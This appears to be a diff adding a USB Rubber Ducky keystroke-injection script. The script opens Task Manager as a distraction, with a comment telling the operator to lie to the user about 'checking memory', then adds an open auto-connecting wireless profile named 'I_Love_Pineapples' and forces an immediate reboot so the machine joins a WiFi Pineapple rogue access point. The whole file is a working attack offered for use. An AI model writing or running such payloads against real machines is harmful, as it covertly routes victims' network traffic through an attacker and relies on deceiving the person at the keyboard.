@@ -1,0 +1,43 @@
+DEFAULT_DELAY 200
+ESC
+ESC
+REM opens task manager for a distraction 
+REM tell user you are checking memory or somthing
+GUI r
+STRING taskmgr
+ENTER
+ALT SPACE
+STRING X
+TAB
+TAB
+TAB
+TAB 
+LEFT
+LEFT
+REM opens network manager
+CTRL ESC
+STRING Manage Wireless Networks
+ENTER
+TAB
+TAB
+TAB
+TAB
+ENTER
+ENTER
+REM creates ap association
+STRING I_Love_Pineapples
+TAB
+DOWN
+TAB
+SPACE
+TAB
+SPACE
+ENTER
+ESC
+ALT F4
+CTRL ESC
+REM reboots for autoconnect to pineapple
+GUI r
+STRING Shutdown.exe -r -t 00
+ENTER
+REM IF you find bug please email me @ mreidiv@yahoo.com
